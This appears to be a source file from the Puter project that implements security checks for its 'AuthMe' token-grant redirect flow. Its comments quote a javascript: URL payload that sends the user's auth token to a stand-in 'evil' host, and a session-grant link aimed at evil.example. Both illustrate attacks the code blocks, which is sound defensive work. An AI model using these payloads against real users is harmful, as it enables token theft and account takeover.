/*
 * Copyright (C) 2024-present Puter Technologies Inc.
 *
 * This file is part of Puter.
 *
 * Puter is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

/**
 * Decisions behind the AuthMe grant, kept out of the dialog so they can be
 * tested without a DOM.
 *
 * AuthMe hands a token to a URL the caller named. Two grades exist: a
 * restricted API token (the default) and a full account session (opt-in). The
 * predicates here decide which grade was asked for and whether the user really
 * approved it.
 */

/** Query-param value that opts into the full-session grade. */
export const FULL_TOKEN_PARAM = 'token_type';
export const FULL_TOKEN_VALUE = 'session';

/**
 * May a grant be delivered to this URL at all?
 *
 * Only `http:` and `https:` are. The scheme that makes this a security check
 * rather than a tidiness one is `javascript:`: the grant is delivered by
 * assigning {@link authmeReturnUrl} to `window.location.href`, and a
 * `javascript:` URL assigned to `location` executes **in this document** — the
 * granting origin, the one holding the session. `URL` only percent-encodes the
 * query it appends, so a payload with no `?` of its own survives intact and a
 * trailing `//` comments the appended `?token=…` out:
 *
 *     javascript:fetch('//evil/'+localStorage.auth_token)//
 *
 * That is same-origin script execution on the account origin, which is worse
 * than any token this flow hands out — and it needs only the default one-click
 * grade, no type-to-confirm. `data:` is refused for the same reason.
 *
 * Checked before the dialog is shown, so an undeliverable target never even
 * gets the chance to be approved.
 *
 * @param {string} redirectURL
 * @returns {boolean}
 */
export const isDeliverableRedirect = (redirectURL) => {
    try {
        const { protocol } = new URL(redirectURL);
        return protocol === 'http:' || protocol === 'https:';
    } catch {
        return false;
    }
};

/**
 * Is this URL served from the machine the browser is running on?
 *
 * Loopback is the whole of the full-session grade's reason to exist: a GUI
 * served by `npm start --server=<remote>` on `http://localhost:<port>`. A
 * loopback target also can't be reached by an attacker — "whatever is
 * listening on that port on the visitor's own machine" cuts both ways, and it
 * is not somewhere a remote page can receive a token.
 *
 * `.localhost` is included per RFC 6761 (always loopback). The whole `127/8`
 * block is loopback, and the anchored pattern doesn't match a name that merely
 * *starts* with a loopback-looking label (`127.0.0.1.evil.example`), just as
 * the `.localhost` suffix test doesn't match `localhost.evil.example`.
 *
 * @param {string} url - Full URL or bare origin; both parse.
 * @returns {boolean}
 */
export const isLoopbackTarget = (url) => {
    if ( ! isDeliverableRedirect(url) ) return false;
    // IPv6 hostnames arrive bracketed from `URL` (`[::1]`).
    const host = new URL(url).hostname.toLowerCase()
        .replace(/^\[/, '').replace(/\]$/, '');
    if ( host === 'localhost' || host.endsWith('.localhost') ) return true;
    if ( host === '::1' ) return true;
    return /^127(\.\d{1,3}){3}$/.test(host);
};

/**
 * Was a full account session explicitly requested?
 *
 * Absent this param the flow can only ever hand over the restricted API token,
 * so an AuthMe link that doesn't name the session grade cannot be talked into
 * producing one.
 *
 * @param {URLSearchParams} params
 * @returns {boolean}
 */
export const wantsFullToken = (params) =>
    params?.get?.(FULL_TOKEN_PARAM) === FULL_TOKEN_VALUE;

/**
 * Should the full-session grade actually be offered for this target?
 *
 * Asking is not enough. The session grade exists for one caller — a locally
 * served dev GUI — and a full session is the credential that can change the
 * password, email, and 2FA settings, i.e. lock the owner out. Honoring
 * `token_type=session` for any destination makes a link like
 *
 *     https://puter.com/?action=authme&token_type=session&redirectURL=https://evil.example/
 *
 * a complete-account-takeover primitive on the real origin, behind nothing but
 * a fixed confirmation phrase that the page sending the victim there can tell
 * them to type. Restricting it to loopback covers every intended use and
 * leaves an attacker no reachable destination.
 *
 * A non-loopback caller that asks anyway is not refused — it falls back to the
 * restricted API token, which is what it would have received before the
 * session grade existed. That keeps the flow working for the consumers that
 * legitimately redirect somewhere remote (the MCP connector's OAuth callback)
 * and keeps the dialog honest: the user is shown, and approves, the grade they
 * are actually handing over.
 *
 * @param {URLSearchParams} params
 * @param {string} redirectURL
 * @returns {boolean}
 */
export const fullTokenAllowed = (params, redirectURL) =>
    wantsFullToken(params) && isLoopbackTarget(redirectURL);

/**
 * Does what the user typed match the confirmation phrase?
 *
 * Trimmed and case-insensitive: the point is a deliberate action, not a
 * spelling test. Only consulted for the full-session grade — a restricted
 * token can't touch the account, so a click is proportionate there.
 *
 * @param {string} typed - Raw input value.
 * @param {string} phrase - The required phrase (localized).
 * @returns {boolean}
 */
export const confirmationSatisfied = (typed, phrase) => {
    const normalize = (s) => String(s ?? '').trim().toLowerCase();
    const wanted = normalize(phrase);
    // An empty phrase would make every input match, including no input at all.
    if ( ! wanted ) return false;
    return normalize(typed) === wanted;
};

/**
 * Build the URL that starts an AuthMe grant on `guiOrigin`.
 *
 * Sole constructor of that link. The dev server prints it in its banner and the
 * GUI navigates to it when it has no session; both go through here so the two
 * can't drift — a mismatch between the parameters one side writes and the other
 * side reads is silent, and has bitten this flow once already.
 *
 * @param {string} guiOrigin - Origin that owns the accounts (the backend's GUI).
 * @param {string} redirectURL - Where the token should be delivered.
 * @param {object} [opts]
 * @param {boolean} [opts.fullToken] - Ask for a full account session rather
 *   than a restricted API token. Requires type-to-confirm on approval.
 * @returns {URL}
 */
export const authmeRequestUrl = (guiOrigin, redirectURL, opts = {}) => {
    const url = new URL(guiOrigin);
    url.searchParams.set('action', 'authme');
    url.searchParams.set('redirectURL', redirectURL);
    if ( opts.fullToken ) {
        url.searchParams.set(FULL_TOKEN_PARAM, FULL_TOKEN_VALUE);
    }
    return url;
};

/**
 * Build the URL an approved AuthMe grant returns to, token attached.
 *
 * The counterpart to {@link urlTokenParam} — these two define the delivery
 * contract between the granting origin and the receiving GUI, so they live
 * next to each other on purpose.
 *
 * Refuses anything {@link isDeliverableRedirect} rejects. Callers are expected
 * to check first and explain the refusal in the UI; throwing here is the
 * backstop that keeps a `javascript:` target from reaching `location.href`
 * through some future caller that forgets, since this is the sole constructor
 * of that navigation.
 *
 * @param {string} redirectURL - The caller-supplied destination.
 * @param {string} token
 * @throws {Error} if `redirectURL` is not an http(s) URL.
 * @returns {URL}
 */
export const authmeReturnUrl = (redirectURL, token) => {
    if ( ! isDeliverableRedirect(redirectURL) ) {
        throw new Error('AuthMe can only redirect to an http(s) URL.');
    }
    const url = new URL(redirectURL);
    url.searchParams.set(RETURN_TOKEN_PARAM, token);
    return url;
};

/** Parameter an approved grant is delivered back in. */
export const RETURN_TOKEN_PARAM = 'token';
/** The GUI's own long-standing URL sign-in parameter. */
export const GUI_TOKEN_PARAM = 'auth_token';

/**
 * Which URL parameter, if any, carries a token to sign in with.
 *
 * Two names are in play. The GUI's own long-standing entry point is
 * `auth_token`. AuthMe, however, returns its grant as `token` — that has always
 * been the contract, and `tools/auth_gui.js` used to bridge it by catching
 * `token` on a throwaway local listener and re-emitting it as `auth_token`. A
 * dev GUI pointed at a remote backend is now sent back here directly, with no
 * listener in between, so `token` has to be understood on arrival.
 *
 * `token` is honored **only** in remote-backend mode. A normal deployment keeps
 * exactly one URL-token entry point, so this doesn't hand puter.com a second
 * way to have a session pushed at it from a link.
 *
 * `auth_token` wins if both are present.
 *
 * @param {URLSearchParams} params
 * @param {boolean} isRemoteBackend - See {@link isRemoteBackendGui}.
 * @returns {'auth_token'|'token'|null}
 */
export const urlTokenParam = (params, isRemoteBackend) => {
    if ( params?.get?.(GUI_TOKEN_PARAM) ) return GUI_TOKEN_PARAM;
    if ( isRemoteBackend && params?.get?.(RETURN_TOKEN_PARAM) ) {
        return RETURN_TOKEN_PARAM;
    }
    return null;
};

/**
 * Is this GUI served from somewhere other than the backend it talks to?
 *
 * True for `npm start --server=<remote>`, which serves the bundled GUI on
 * localhost while pointing `gui_origin` at a remote Puter. That GUI has no
 * `/login` it can post to — the route accepts only its own origin, because it
 * answers with a session token — so it hands off to the remote's AuthMe flow
 * instead.
 *
 * @param {string} [guiOrigin] - `window.gui_origin`.
 * @param {string} [locationOrigin] - `window.location.origin`.
 * @returns {boolean}
 */
export const isRemoteBackendGui = (guiOrigin, locationOrigin) => {
    if ( ! guiOrigin || ! locationOrigin ) return false;
    return guiOrigin !== locationOrigin;
};

/**
 * Should this GUI hand sign-in off to the remote backend's AuthMe flow?
 *
 * {@link isRemoteBackendGui} alone answers "are these two origins different",
 * which is also true for a deployment reached over a hostname that isn't its
 * `config.origin` — an alias, a `www.` variant, a staging name. Such a page
 * would otherwise start accepting `?token=` as a sign-in credential and would
 * bounce unauthenticated visitors into a session grant automatically, neither
 * of which is wanted on a real deployment.
 *
 * The supported setup is a locally served GUI, so require that too. Anything
 * else falls through to the ordinary login window it has always used.
 *
 * @param {string} [guiOrigin] - `window.gui_origin`.
 * @param {string} [locationOrigin] - `window.location.origin`.
 * @returns {boolean}
 */
export const shouldUseRemoteAuthme = (guiOrigin, locationOrigin) =>
    isRemoteBackendGui(guiOrigin, locationOrigin)
        && isLoopbackTarget(locationOrigin);
